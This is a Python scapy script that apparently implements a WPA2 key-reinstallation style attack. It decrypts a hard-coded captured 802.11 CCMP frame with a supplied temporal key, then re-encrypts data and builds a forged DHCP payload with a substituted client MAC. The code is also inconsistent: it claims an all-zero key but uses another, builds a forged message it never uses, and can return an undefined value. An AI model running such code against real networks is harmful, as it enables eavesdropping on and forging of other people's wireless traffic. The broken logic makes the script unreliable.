#!/usr/bin/python3
# -*- coding: utf-8 -*-​
import sys, os, time, re, argparse, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.sendrecv import sniff, sendp
from scapy.layers.dot11 import Dot11, RadioTap, Dot11CCMP, Dot11FCS
from Crypto.Cipher import AES
from subprocess import run, PIPE



def decrypt(pkt, tk):
    """
    try to decrypt traffic using all-zero tk
    """
    try:
        addr2 = re.sub(":","",pkt.addr2)
        print("addr2 : ", addr2)
        # addr4 = re.sub(":","",fcs.addr4)
        PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(pkt.PN5,pkt.PN4,pkt.PN3,pkt.PN2,pkt.PN1,pkt.PN0)
        print("PN : ",PN)
        # Priority Octet "00" 
        nonce = bytes.fromhex("00") + bytes.fromhex(addr2) + bytes.fromhex(PN)               
        TK = bytes.fromhex(tk) #TK
        print("密文 : ", pkt.data.hex())
        # cipher_text = pkt.data[:-8]
        cipher_text = pkt.data
        # print("cipher_text : ", cipher_text.hex())
        
        # 真正解密过程
        cipher = AES.new(TK, AES.MODE_CCM, nonce, mac_len=8)
        cipher2 = AES.new(TK, AES.MODE_CCM, nonce, mac_len=8)
        # cipher.update(AAD)
        plain_text = cipher.decrypt(cipher_text)
        
        p2 = LLC(plain_text)
        p2.show()
        print("明文 : ", plain_text.hex())            # 解密后明文
        
        
        mingwen = "aaaa0300000008004500015ac10500008011788e00000000ffffffff0044004301462d5c01010600ccbfab040000000000000000000000000000000000000000e4029b5cfefe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000638253633501033d0701e4029b5cfefe3204c0a804770c0d62696368656e7368616f2d7063511000000062696368656e7368616f2d70633c084d53465420352e30370e0103060f1f212b2c2e2f7779f9fcffe818890fb7a5a580"
        mac_client = "001d4320192d"
        msg = mingwen.replace("e4029b5cfefe", mac_client)
        miwen = cipher2.encrypt(bytes.fromhex(plain_text.hex()))
        print("再加密密文 : ", miwen.hex())


    except AssertionError:
        pass
        
    return miwen.hex()


p = "000008000000000088410000584120fd26ed001d4320192dffffffffffff400000000100002000000000eb167fc367a7acbe26959ba7cf8c538a9c0e87a55b10e2e64c7f321b4f11ee2131b5bb84"

packet = RadioTap(bytes.fromhex(p))[Dot11]

tk = "2ba8b10b6eba1a745b7670cd1659c2b0"
e = decrypt(packet, tk)
